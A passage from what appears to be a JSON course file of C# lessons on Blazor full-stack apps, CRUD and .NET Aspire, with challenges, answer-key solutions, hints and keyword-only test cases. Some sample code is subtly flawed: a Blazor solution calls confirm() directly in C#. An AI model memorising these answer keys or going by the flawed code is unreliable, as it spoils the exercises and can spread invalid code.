Results.Ok(todo);\n});\n\napp.MapDelete(\"\"/api/todos/{id}\"\", (int id) => {\n    var todo = todos.FirstOrDefault(t => t.Id == id);\n    if (todo is null) return Results.NotFound();\n    \n    todos.Remove(todo);\n    return Results.NoContent();\n});\n\napp.Run();\n\"\");\n\nConsole.WriteLine(@\"\n=== BLAZOR (FRONTEND) - TodoList.razor ===\");\nConsole.WriteLine(@\"\n@inject HttpClient Http\n\n<div class=\"\"container\"\">\n    <h3>📝 Full-Stack Todo App</h3>\n    \n    @if (isLoading)\n    {\n        <div class=\"\"spinner-border\"\" role=\"\"status\"\"></div>\n        <span>Loading...</span>\n    }\n    else if (errorMessage != null)\n    {\n        <div class=\"\"alert alert-danger\"\">@errorMessage</div>\n    }\n    else\n    {\n        <div class=\"\"mb-3\"\">\n            <input @bind=\"\"newTodoTitle\"\" class=\"\"form-control\"\" placeholder=\"\"New todo...\"\" />\n            <button class=\"\"btn btn-primary\"\" @onclick=\"\"AddTodo\"\">Add</button>\n        </div>\n        \n        <ul class=\"\"list-group\"\">\n            @foreach (var todo in todos)\n            {\n                <li class=\"\"list-group-item\"\">\n                    <input \n                        type=\"\"checkbox\"\" \n                        checked=\"\"@todo.IsCompleted\"\n                        @onchange=\"\"() => ToggleTodo(todo)\"\" />\n                    <span class=\"\"@(todo.IsCompleted ? \\\"\"text-decoration-line-through\\\"\" : \"\"\"\")\"\">\n                        @todo.Title\n                    </span>\n                    <button \n                        class=\"\"btn btn-sm btn-danger float-end\"\" \n                        @onclick=\"\"() => DeleteTodo(todo.Id)\"\">Delete</button>\n                </li>\n            }\n        </ul>\n    }\n</div>\n\n@code {\n    private class Todo {\n        public int Id { get; set; }\n        public string Title { get; set; } = \"\"\"\";\n        public bool IsCompleted { get; set; }\n    }\n    \n    private List<Todo> todos = new();\n    private string newTodoTitle = \"\"\"\";\n    private bool isLoading = true;\n    private string? errorMessage;\n    \n    protected override async Task OnInitializedAsync()\n    {\n        await LoadTodos();\n    }\n    \n    private async Task LoadTodos()\n    {\n        try\n        {\n            isLoading = true;\n            todos = await Http.GetFromJsonAsync<List<Todo>>(\"\"https://localhost:5001/api/todos\"\") ?? new();\n            errorMessage = null;\n        }\n        catch (HttpRequestException ex)\n        {\n            errorMessage = $\"\"API Error: {ex.Message}\"\";\n        }\n        finally\n        {\n            isLoading = false;\n        }\n    }\n    \n    private async Task AddTodo()\n    {\n        if (string.IsNullOrWhiteSpace(newTodoTitle)) return;\n        \n        var newTodo = new Todo { Title = newTodoTitle, IsCompleted = false };\n        var response = await Http.PostAsJsonAsync(\"\"https://localhost:5001/api/todos\"\", newTodo);\n        \n        if (response.IsSuccessStatusCode)\n        {\n            newTodoTitle = \"\"\"\";\n            await LoadTodos();\n        }\n    }\n    \n    private async Task ToggleTodo(Todo todo)\n    {\n        todo.IsCompleted = !todo.IsCompleted;\n        await Http.PutAsJsonAsync($\"\"https://localhost:5001/api/todos/{todo.Id}\"\", todo);\n    }\n    \n    private async Task DeleteTodo(int id)\n    {\n        var response = await Http.DeleteAsync($\"\"https://localhost:5001/api/todos/{id}\"\");\n        if (response.IsSuccessStatusCode)\n        {\n            await LoadTodos();\n        }\n    }\n}\n\"\");\n\nConsole.WriteLine(@\"\n=== FULL-STACK ARCHITECTURE ===\");\nConsole.WriteLine(\"Frontend (Blazor) → HttpClient → API → Database\");\nConsole.WriteLine(\"✓ Blazor: UI, user interaction\");\nConsole.WriteLine(\"✓ HttpClient: Communication layer\");\nConsole.WriteLine(\"✓ API: Business logic, data access\");\nConsole.WriteLine(\"✓ Separation of concerns!\");\nConsole.WriteLine(\"\\nYou're now a FULL-STACK developer!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"API\"",
                  "expectedOutput": "API",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"BACKEND\"",
                  "expectedOutput": "BACKEND",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Blazor\"",
                  "expectedOutput": "Blazor",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"FRONTEND\"",
                  "expectedOutput": "FRONTEND",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"HttpClient\"",
                  "expectedOutput": "HttpClient",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"FULL-STACK\"",
                  "expectedOutput": "FULL-STACK",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "API: MapGet/Post/Put/Delete endpoints. Blazor: @inject HttpClient, GetFromJsonAsync<T>, PostAsJsonAsync, PutAsJsonAsync, DeleteAsync. Handle loading state and errors!"
                },
                {
                  "level": 2,
                  "text": "CORS errors: Blazor WebAssembly needs CORS enabled on API! Use app.UseCors() with AllowAnyOrigin(). Browser console shows 'CORS policy' error if missing."
                },
                {
                  "level": 3,
                  "text": "Base address: Configure HttpClient.BaseAddress in Program.cs! Otherwise, use full URLs in every request. BaseAddress = \"https://localhost:5001/\" lets you use relative URLs."
                },
                {
                  "level": 4,
                  "text": "Null reference: GetFromJsonAsync returns null if API not running! Always check: 'todos = await Http.Get...() ?? new();' or handle null explicitly."
                },
                {
                  "level": 5,
                  "text": "Forgetting await: HttpClient methods are async! Must use 'await'. Forgetting await = code continues before response arrives (race condition!). Always await HTTP calls!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "CORS errors",
                  "consequence": "Blazor WebAssembly needs CORS enabled on API! Use app.UseCors() with AllowAnyOrigin(). Browser console shows 'CORS policy' error if missing.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Base address",
                  "consequence": "Configure HttpClient.BaseAddress in Program.cs! Otherwise, use full URLs in every request. BaseAddress = \"https://localhost:5001/\" lets you use relative URLs.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Null reference",
                  "consequence": "GetFromJsonAsync returns null if API not running! Always check: 'todos = await Http.Get...() ?? new();' or handle null explicitly.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting await",
                  "consequence": "HttpClient methods are async! Must use 'await'. Forgetting await = code continues before response arrives (race condition!). Always await HTTP calls!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-14-02",
          "title": "Full CRUD Operations (Complete Data Management)",
          "moduleId": "module-14",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "CRUD = Create, Read, Update, Delete - The four essential database operations:\n\nRestaurant analogy:\n• CREATE: Add new dish to menu\n• READ: View menu\n• UPDATE: Change dish price\n• DELETE: Remove dish from menu\n\nFull-stack CRUD:\nBlazor UI → HTTP → API → EF Core → Database\n\n✅ CREATE: Form → POST → API → db.Add() → SaveChanges()\n✅ READ: Load → GET → API → db.ToList() → Display\n✅ UPDATE: Edit → PUT → API → db.Update() → SaveChanges()\n✅ DELETE: Button → DELETE → API → db.Remove() → SaveChanges()\n\nThink: CRUD = 'The foundation of every data-driven application!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// FULL CRUD API\napp.MapGet(\"/api/products\", async (AppDbContext db) =>\n    await db.Products.ToListAsync());\n\napp.MapGet(\"/api/products/{id}\", async (int id, AppDbContext db) =>\n    await db.Products.FindAsync(id));\n\napp.MapPost(\"/api/products\", async (Product product, AppDbContext db) => {\n    db.Products.Add(product);\n    await db.SaveChangesAsync();\n    return Results.Created($\"/api/products/{product.Id}\", product);\n});\n\napp.MapPut(\"/api/products/{id}\", async (int id, Product updated, AppDbContext db) => {\n    var product = await db.Products.FindAsync(id);\n    if (product is null) return Results.NotFound();\n    \n    product.Name = updated.Name;\n    product.Price = updated.Price;\n    await db.SaveChangesAsync();\n    return Results.Ok(product);\n});\n\napp.MapDelete(\"/api/products/{id}\", async (int id, AppDbContext db) => {\n    var product = await db.Products.FindAsync(id);\n    if (product is null) return Results.NotFound();\n    \n    db.Products.Remove(product);\n    await db.SaveChangesAsync();\n    return Results.NoContent();\n});\n\n// BLAZOR CRUD COMPONENT\n@inject HttpClient Http\n\n<h3>Product Manager</h3>\n\n<button @onclick=\"ShowCreateForm\">Add Product</button>\n\n@if (showForm)\n{\n    <EditForm Model=\"@currentProduct\" OnValidSubmit=\"SaveProduct\">\n        <InputText @bind-Value=\"currentProduct.Name\" />\n        <InputNumber @bind-Value=\"currentProduct.Price\" />\n        <button type=\"submit\">Save</button>\n        <button type=\"button\" @onclick=\"CancelForm\">Cancel</button>\n    </EditForm>\n}\n\n<table>\n    @foreach (var product in products)\n    {\n        <tr>\n            <td>@product.Name</td>\n            <td>$@product.Price</td>\n            <td>\n                <button @onclick=\"() => EditProduct(product)\">Edit</button>\n                <button @onclick=\"() => DeleteProduct(product.Id)\">Delete</button>\n            </td>\n        </tr>\n    }\n</table>\n\n@code {\n    private List<Product> products = new();\n    private Product currentProduct = new();\n    private bool showForm = false;\n    private bool isEditing = false;\n    \n    protected override async Task OnInitializedAsync() {\n        await LoadProducts();\n    }\n    \n    private async Task LoadProducts() {\n        products = await Http.GetFromJsonAsync<List<Product>>(\n            \"https://localhost:5001/api/products\") ?? new();\n    }\n    \n    private void ShowCreateForm() {\n        currentProduct = new Product();\n        isEditing = false;\n        showForm = true;\n    }\n    \n    private void EditProduct(Product product) {\n        currentProduct = new Product {\n            Id = product.Id,\n            Name = product.Name,\n            Price = product.Price\n        };\n        isEditing = true;\n        showForm = true;\n    }\n    \n    private async Task SaveProduct() {\n        if (isEditing) {\n            await Http.PutAsJsonAsync(\n                $\"https://localhost:5001/api/products/{currentProduct.Id}\", \n                currentProduct);\n        } else {\n            await Http.PostAsJsonAsync(\n                \"https://localhost:5001/api/products\", \n                currentProduct);\n        }\n        \n        showForm = false;\n        await LoadProducts();\n    }\n    \n    private async Task DeleteProduct(int id) {\n        await Http.DeleteAsync($\"https://localhost:5001/api/products/{id}\");\n        await LoadProducts();\n    }\n    \n    private void CancelForm() {\n        showForm = false;\n    }\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`EditForm component`**: Blazor form with validation. Model=\"@object\" binds form. OnValidSubmit fires when valid. InputText, InputNumber are built-in inputs with validation.\n\n**`Create vs Update pattern`**: Use boolean flag (isEditing). If true: PUT existing. If false: POST new. Same form, different API call based on context.\n\n**`SaveChangesAsync()`**: EF Core persists changes to database. Call after Add/Update/Remove. Returns number of affected rows. Always await!\n\n**`Reload after changes`**: After Create/Update/Delete, reload data from API. Ensures UI shows latest database state. Call LoadProducts() after operations."
            },
            {
              "type": "WARNING",
              "title": "CRUD Security & Best Practices",
              "content": "## Security Considerations\n\n**Input Validation** (always validate!):\n- Use DataAnnotations: [Required], [StringLength], [Range]\n- Validate on BOTH client (Blazor) AND server (API)\n- Never trust client data - always re-validate on API\n\n**Delete Operations**:\n- Always confirm before delete\n- Consider soft-delete (IsDeleted flag) vs hard-delete\n- Cascading deletes can be dangerous!\n\n**Optimistic Concurrency**:\n- Add RowVersion/Timestamp to entities\n- Detect if someone else modified data\n- Prevents overwriting others' changes\n\n**API Security**:\n- Add [Authorize] to protect endpoints\n- Validate user owns the resource before update/delete\n- Return 404 (not 403) to hide resource existence"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-14-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build complete CRUD for a Book Library!\n\n1. Book model (Id, Title, Author, Year, ISBN)\n\n2. API with all CRUD endpoints:\n   - GET /api/books (list all)\n   - GET /api/books/{id} (single)\n   - POST /api/books (create)\n   - PUT /api/books/{id} (update)\n   - DELETE /api/books/{id} (delete)\n\n3. Blazor component:\n   - List books in table\n   - Add button → shows form\n   - Edit button for each book → populates form\n   - Delete button with confirmation\n   - Form with all fields\n   - Save/Cancel buttons\n   - Reload after operations\n\n4. Print complete API and Blazor code!",
              "starterCode": "// API\napp.MapGet(\"/api/books\", async (AppDbContext db) => {\n    // Return all books\n});\n\n// Add other CRUD endpoints...\n\n// Blazor - BookManager.razor\n@inject HttpClient Http\n\n<h3>Book Library</h3>\n\n@if (showForm)\n{\n    <EditForm Model=\"@currentBook\" OnValidSubmit=\"SaveBook\">\n        <!-- Form fields -->\n    </EditForm>\n}\n\n<!-- Table of books -->\n\n@code {\n    private List<Book> books = new();\n    private Book currentBook = new();\n    private bool showForm = false;\n    private bool isEditing = false;\n}",
              "solution": "Console.WriteLine(@\"\n=== FULL CRUD API ===\");\nConsole.WriteLine(@\"\nusing Microsoft.EntityFrameworkCore;\n\nvar builder = WebApplication.CreateBuilder(args);\nbuilder.Services.AddDbContext<AppDbContext>();\nvar app = builder.Build();\n\nclass Book {\n    public int Id { get; set; }\n    public string Title { get; set; } = \"\"\"\";\n    public string Author { get; set; } = \"\"\"\";\n    public int Year { get; set; }\n    public string ISBN { get; set; } = \"\"\"\";\n}\n\n// CREATE\napp.MapPost(\"\"/api/books\"\", async (Book book, AppDbContext db) => {\n    db.Books.Add(book);\n    await db.SaveChangesAsync();\n    return Results.Created($\"\"/api/books/{book.Id}\"\", book);\n});\n\n// READ - All\napp.MapGet(\"\"/api/books\"\", async (AppDbContext db) =>\n    await db.Books.ToListAsync());\n\n// READ - Single\napp.MapGet(\"\"/api/books/{id}\"\", async (int id, AppDbContext db) => {\n    var book = await db.Books.FindAsync(id);\n    return book is not null ? Results.Ok(book) : Results.NotFound();\n});\n\n// UPDATE\napp.MapPut(\"\"/api/books/{id}\"\", async (int id, Book updated, AppDbContext db) => {\n    var book = await db.Books.FindAsync(id);\n    if (book is null) return Results.NotFound();\n    \n    book.Title = updated.Title;\n    book.Author = updated.Author;\n    book.Year = updated.Year;\n    book.ISBN = updated.ISBN;\n    \n    await db.SaveChangesAsync();\n    return Results.Ok(book);\n});\n\n// DELETE\napp.MapDelete(\"\"/api/books/{id}\"\", async (int id, AppDbContext db) => {\n    var book = await db.Books.FindAsync(id);\n    if (book is null) return Results.NotFound();\n    \n    db.Books.Remove(book);\n    await db.SaveChangesAsync();\n    return Results.NoContent();\n});\n\napp.Run();\n\"\");\n\nConsole.WriteLine(@\"\n=== BLAZOR CRUD COMPONENT ===\");\nConsole.WriteLine(@\"\n// BookManager.razor\n@inject HttpClient Http\n\n<div class=\"\"container\"\">\n    <h3>📚 Book Library Manager</h3>\n    \n    <button class=\"\"btn btn-primary\"\" @onclick=\"\"ShowCreateForm\"\">➕ Add New Book</button>\n    \n    @if (showForm)\n    {\n        <div class=\"\"card mt-3\"\">\n            <div class=\"\"card-body\"\">\n                <h5>@(isEditing ? \"\"Edit Book\"\" : \"\"Add New Book\"\")</h5>\n                <EditForm Model=\"\"@currentBook\"\" OnValidSubmit=\"\"SaveBook\"\">\n                    <div class=\"\"mb-2\"\">\n                        <label>Title:</label>\n                        <InputText @bind-Value=\"\"currentBook.Title\"\" class=\"\"form-control\"\" />\n                    </div>\n                    <div class=\"\"mb-2\"\">\n                        <label>Author:</label>\n                        <InputText @bind-Value=\"\"currentBook.Author\"\" class=\"\"form-control\"\" />\n                    </div>\n                    <div class=\"\"mb-2\"\">\n                        <label>Year:</label>\n                        <InputNumber @bind-Value=\"\"currentBook.Year\"\" class=\"\"form-control\"\" />\n                    </div>\n                    <div class=\"\"mb-2\"\">\n                        <label>ISBN:</label>\n                        <InputText @bind-Value=\"\"currentBook.ISBN\"\" class=\"\"form-control\"\" />\n                    </div>\n                    <button type=\"\"submit\"\" class=\"\"btn btn-success\"\">💾 Save</button>\n                    <button type=\"\"button\"\" class=\"\"btn btn-secondary\"\" @onclick=\"\"CancelForm\"\">Cancel</button>\n                </EditForm>\n            </div>\n        </div>\n    }\n    \n    <table class=\"\"table table-striped mt-3\"\">\n        <thead>\n            <tr>\n                <th>Title</th>\n                <th>Author</th>\n                <th>Year</th>\n                <th>ISBN</th>\n                <th>Actions</th>\n            </tr>\n        </thead>\n        <tbody>\n            @foreach (var book in books)\n            {\n                <tr>\n                    <td>@book.Title</td>\n                    <td>@book.Author</td>\n                    <td>@book.Year</td>\n                    <td>@book.ISBN</td>\n                    <td>\n                        <button class=\"\"btn btn-sm btn-warning\"\" @onclick=\"\"() => EditBook(book)\"\">✏️ Edit</button>\n                        <button class=\"\"btn btn-sm btn-danger\"\" @onclick=\"\"() => DeleteBook(book.Id)\"\">🗑️ Delete</button>\n                    </td>\n                </tr>\n            }\n        </tbody>\n    </table>\n    \n    <p><strong>Total Books: @books.Count</strong></p>\n</div>\n\n@code {\n    private class Book {\n        public int Id { get; set; }\n        public string Title { get; set; } = \"\"\"\";\n        public string Author { get; set; } = \"\"\"\";\n        public int Year { get; set; }\n        public string ISBN { get; set; } = \"\"\"\";\n    }\n    \n    private List<Book> books = new();\n    private Book currentBook = new();\n    private bool showForm = false;\n    private bool isEditing = false;\n    \n    protected override async Task OnInitializedAsync() {\n        await LoadBooks();\n    }\n    \n    private async Task LoadBooks() {\n        books = await Http.GetFromJsonAsync<List<Book>>(\"\"https://localhost:5001/api/books\"\") ?? new();\n    }\n    \n    private void ShowCreateForm() {\n        currentBook = new Book();\n        isEditing = false;\n        showForm = true;\n    }\n    \n    private void EditBook(Book book) {\n        currentBook = new Book {\n            Id = book.Id,\n            Title = book.Title,\n            Author = book.Author,\n            Year = book.Year,\n            ISBN = book.ISBN\n        };\n        isEditing = true;\n        showForm = true;\n    }\n    \n    private async Task SaveBook() {\n        if (isEditing) {\n            await Http.PutAsJsonAsync($\"\"https://localhost:5001/api/books/{currentBook.Id}\"\", currentBook);\n        } else {\n            await Http.PostAsJsonAsync(\"\"https://localhost:5001/api/books\"\", currentBook);\n        }\n        \n        showForm = false;\n        await LoadBooks();\n    }\n    \n    private async Task DeleteBook(int id) {\n        if (confirm(\\\"\"Delete this book?\\\"\")) {\n            await Http.DeleteAsync($\"\"https://localhost:5001/api/books/{id}\"\");\n            await LoadBooks();\n        }\n    }\n    \n    private void CancelForm() {\n        showForm = false;\n    }\n}\n\"\");\n\nConsole.WriteLine(@\"\n=== CRUD COMPLETE! ===\");\nConsole.WriteLine(\"✓ CREATE: POST with form data\");\nConsole.WriteLine(\"✓ READ: GET for list and details\");\nConsole.WriteLine(\"✓ UPDATE: PUT with modified data\");\nConsole.WriteLine(\"✓ DELETE: DELETE by ID\");\nConsole.WriteLine(\"\\nYou've built a complete data management system!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"CRUD\"",
                  "expectedOutput": "CRUD",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"CREATE\"",
                  "expectedOutput": "CREATE",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"READ\"",
                  "expectedOutput": "READ",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"UPDATE\"",
                  "expectedOutput": "UPDATE",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"DELETE\"",
                  "expectedOutput": "DELETE",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"EditForm\"",
                  "expectedOutput": "EditForm",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "API: MapPost (Create), MapGet (Read), MapPut (Update), MapDelete (Delete). Blazor: EditForm for input, HttpClient for requests, reload after changes. Track isEditing for Create vs Update."
                },
                {
                  "level": 2,
                  "text": "Modifying original object: When editing, create NEW object copy! Otherwise, changes appear immediately in UI before save. Clone object: 'new Book { Id = book.Id, ... }'."
                },
                {
                  "level": 3,
                  "text": "Not reloading data: After Create/Update/Delete, UI shows stale data! Always reload: 'await LoadBooks();' after operations. Otherwise, database and UI out of sync."
                },
                {
                  "level": 4,
                  "text": "Missing confirmation: DELETE without confirmation is dangerous! Users accidentally click. Add: 'if (confirm(\"Delete?\"))' or modal dialog before delete."
                },
                {
                  "level": 5,
                  "text": "Form validation: EditForm needs validation! Add DataAnnotations: [Required], [StringLength], etc. Or use OnInvalidSubmit to handle errors. Validate before API call!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Modifying original object",
                  "consequence": "When editing, create NEW object copy! Otherwise, changes appear immediately in UI before save. Clone object: 'new Book { Id = book.Id, ... }'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not reloading data",
                  "consequence": "After Create/Update/Delete, UI shows stale data! Always reload: 'await LoadBooks();' after operations. Otherwise, database and UI out of sync.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Missing confirmation",
                  "consequence": "DELETE without confirmation is dangerous! Users accidentally click. Add: 'if (confirm(\"Delete?\"))' or modal dialog before delete.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Form validation",
                  "consequence": "EditForm needs validation! Add DataAnnotations: [Required], [StringLength], etc. Or use OnInvalidSubmit to handle errors. Validate before API call!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-14-03",
          "title": ".NET Aspire (Modern Distributed Apps)",
          "moduleId": "module-14",
          "order": 3,
          "estimatedMinutes": 20,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine building a restaurant chain:\n\nOLD WAY (docker-compose):\n- Write YAML files for each service\n- Manually configure networking\n- No visibility into what's happening\n- Debug by reading logs from 5 terminals\n\n.NET ASPIRE WAY:\n- One orchestrator project\n- Automatic service discovery\n- Dashboard shows EVERYTHING\n- Click to see traces, logs, metrics\n\n.NET Aspire = 'The conductor for your microservices orchestra. It knows where everyone is, when they're playing, and shows you the whole performance in real-time!'\n\nKey components:\n• AppHost - The orchestrator (defines your apps)\n• ServiceDefaults - Shared config (health checks, telemetry)\n• Dashboard - Real-time observability\n• Service Discovery - Apps find each other automatically"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates .NET Aspire in action.",
              "code": "// === APPHOST PROJECT (Orchestrator) ===\n// MyApp.AppHost/Program.cs\n\nvar builder = DistributedApplication.CreateBuilder(args);\n\n// Add a Redis cache\nvar cache = builder.AddRedis(\"cache\");\n\n// Add PostgreSQL database\nvar postgres = builder.AddPostgres(\"postgres\")\n    .AddDatabase(\"ordersdb\");\n\n// Add API service (references cache + db)\nvar api = builder.AddProject<Projects.OrdersApi>(\"orders-api\")\n    .WithReference(cache)\n    .WithReference(postgres);\n\n// Add Blazor frontend (references API)\nbuilder.AddProject<Projects.WebFrontend>(\"web-frontend\")\n    .WithReference(api);\n\nbuilder.Build().Run();\n\n// === SERVICE DEFAULTS ===\n// MyApp.ServiceDefaults/Extensions.cs\npublic static IHostApplicationBuilder AddServiceDefaults(\n    this IHostApplicationBuilder builder)\n{\n    // OpenTelemetry (automatic tracing!)\n    builder.ConfigureOpenTelemetry();\n    \n    // Health checks\n    builder.AddDefaultHealthChecks();\n    \n    // Service discovery\n    builder.Services.AddServiceDiscovery();\n    \n    return builder;\n}\n\n// === API PROJECT ===\n// OrdersApi/Program.cs\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add Aspire service defaults\nbuilder.AddServiceDefaults();\n\n// Add Redis cache (Aspire handles connection!)\nbuilder.AddRedisClient(\"cache\");\n\n// Add PostgreSQL via EF Core\nbuilder.AddNpgsqlDbContext<OrdersDbContext>(\"ordersdb\");\n\nvar app = builder.Build();\n\napp.MapDefaultEndpoints(); // Health checks\napp.MapGet(\"/orders\", async (OrdersDbContext db) =>\n    await db.Orders.ToListAsync());\n\napp.Run();\n\n// === BENEFITS ===\n// 1. No connection strings! Aspire injects them\n// 2. Service discovery: Use \"orders-api\" as hostname\n// 3. Dashboard: See all logs, traces, metrics\n// 4. Health checks: Automatic\n// 5. Telemetry: Built-in OpenTelemetry",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`DistributedApplication.CreateBuilder()`**: Creates Aspire orchestrator. This is like WebApplication.CreateBuilder() but for multiple services.\n\n**`builder.AddProject<T>(\"name\")`**: Adds a .NET project to orchestration. The name becomes the service discovery hostname.\n\n**`.WithReference()`**: Connects services. Aspire injects connection strings automatically. No more appsettings.json connection string juggling!\n\n**`builder.AddRedis/Postgres()`**: Adds containers automatically. Aspire downloads and runs them. In production, swap to Azure/AWS versions.\n\n**`AddServiceDefaults()`**: Shared configuration. Adds OpenTelemetry, health checks, service discovery. Every service gets consistent observability."
            },
            {
              "type": "KEY_POINT",
              "title": "Key Takeaways",
              "content": "## Why .NET Aspire?\n\n**Before Aspire:** docker-compose.yml + manual networking + multiple terminals + no visibility = pain\n\n**With Aspire:** One C# project + automatic service discovery + beautiful dashboard + built-in telemetry = joy\n\n**Dashboard features:**\n- Real-time logs from all services\n- Distributed traces (see request flow!)\n- Metrics and health status\n- GenAI Visualizer for LLM calls (Aspire 9.5+)\n\n**When to use:** Any app with 2+ services, databases, or caches. Aspire makes local development feel like production."
            },
            {
              "type": "WARNING",
              "title": "Important Notes",
              "content": "## .NET Aspire Updates (2025)\n\n**Current Version: 9.5** - Key features:\n- Self-contained SDK (no workload installation needed)\n- Single-file AppHost option\n- GenAI Visualizer for AI/LLM debugging\n- Mobile-responsive dashboard\n- Start/stop individual resources\n- Azure Functions preview support\n- AWS CDK integration\n\n**Aspire CLI** (GA in 9.4+):\n```bash\naspire new starter --name MyApp\naspire run\naspire deploy\n```\n\n**Dashboard URL:** http://localhost:15888 (default)\n\n**Production Deployment:**\n- Use `azd init` + `azd up` for Azure Container Apps\n- Replace AddRedis() with AddAzureRedis() for cloud\n- Aspire generates deployment manifests automatically"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-14-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Create an Aspire-orchestrated application architecture.",
              "instructions": "Design a .NET Aspire application!\n\nPrint the code structure for:\n\n1. AppHost (orchestrator):\n   - Add Redis cache\n   - Add SQL Server database\n   - Add 'catalog-api' project with references\n   - Add 'web-store' frontend with API reference\n\n2. Catalog API service:\n   - AddServiceDefaults()\n   - AddSqlServerDbContext for products\n   - MapDefaultEndpoints()\n   - GET /products endpoint\n\n3. Explain the benefits:\n   - No hardcoded connection strings\n   - Automatic service discovery\n   - Dashboard observability\n   - One-click debugging\n\nShow how Aspire replaces docker-compose!",
              "starterCode": "Console.WriteLine(\"=== .NET ASPIRE ARCHITECTURE ===\");\n\nConsole.WriteLine(\"\\n--- APPHOST PROJECT (Orchestrator) ---\");\nConsole.WriteLine(@\"\nvar builder = DistributedApplication.CreateBuilder(args);\n\n// TODO: Add Redis cache\n// TODO: Add SQL Server\n// TODO: Add catalog-api with references\n// TODO: Add web-store frontend\n\nbuilder.Build().Run();\n\");\n\nConsole.WriteLine(\"\\n--- CATALOG API PROJECT ---\");\n// TODO: Show API setup with Aspire\n\nConsole.WriteLine(\"\\n--- BENEFITS vs DOCKER-COMPOSE ---\");\n// TODO: List benefits",
              "solution": "Console.WriteLine(\"=== .NET ASPIRE ARCHITECTURE ===\");\n\nConsole.WriteLine(\"\\n--- APPHOST PROJECT (Orchestrator) ---\");\nConsole.WriteLine(@\"\n// MyStore.AppHost/Program.cs\nvar builder = DistributedApplication.CreateBuilder(args);\n\n// Infrastructure\nvar cache = builder.AddRedis(\"\"cache\"\");\nvar sql = builder.AddSqlServer(\"\"sql\"\")\n    .AddDatabase(\"\"catalogdb\"\");\n\n// Services\nvar catalogApi = builder.AddProject<Projects.CatalogApi>(\"\"catalog-api\"\")\n    .WithReference(cache)\n    .WithReference(sql);\n\n// Frontend\nbuilder.AddProject<Projects.WebStore>(\"\"web-store\"\")\n    .WithReference(catalogApi);\n\nbuilder.Build().Run();\n\");\n\nConsole.WriteLine(\"\\n--- CATALOG API PROJECT ---\");\nConsole.WriteLine(@\"\n// CatalogApi/Program.cs\nvar builder = WebApplication.CreateBuilder(args);\n\n// Aspire defaults (telemetry, health, discovery)\nbuilder.AddServiceDefaults();\n\n// Database (connection injected by Aspire!)\nbuilder.AddSqlServerDbContext<CatalogContext>(\"\"catalogdb\"\");\n\n// Cache (connection injected by Aspire!)\nbuilder.AddRedisClient(\"\"cache\"\");\n\nvar app = builder.Build();\n\n// Health endpoints for dashboard\napp.MapDefaultEndpoints();\n\n// API endpoints\napp.MapGet(\"\"/products\"\", async (CatalogContext db) =>\n    await db.Products.ToListAsync());\n\napp.Run();\n\");\n\nConsole.WriteLine(\"\\n--- WEB STORE FRONTEND ---\");\nConsole.WriteLine(@\"\n// WebStore/Program.cs\nvar builder = WebApplication.CreateBuilder(args);\nbuilder.AddServiceDefaults();\n\n// HttpClient with service discovery!\nbuilder.Services.AddHttpClient<CatalogClient>(client =>\n{\n    // \"\"catalog-api\"\" resolved by Aspire!\n    client.BaseAddress = new Uri(\"\"http://catalog-api\"\");\n});\n\nbuilder.Build().Run();\n\");\n\nConsole.WriteLine(\"\\n=== BENEFITS vs DOCKER-COMPOSE ===\");\nConsole.WriteLine(\"DOCKER-COMPOSE:\");\nConsole.WriteLine(\"  - Write YAML by hand\");\nConsole.WriteLine(\"  - Configure networks manually\");\nConsole.WriteLine(\"  - Hardcode connection strings\");\nConsole.WriteLine(\"  - No observability dashboard\");\nConsole.WriteLine(\"  - Debug with 'docker logs' commands\");\n\nConsole.WriteLine(\"\\n.NET ASPIRE:\");\nConsole.WriteLine(\"  + 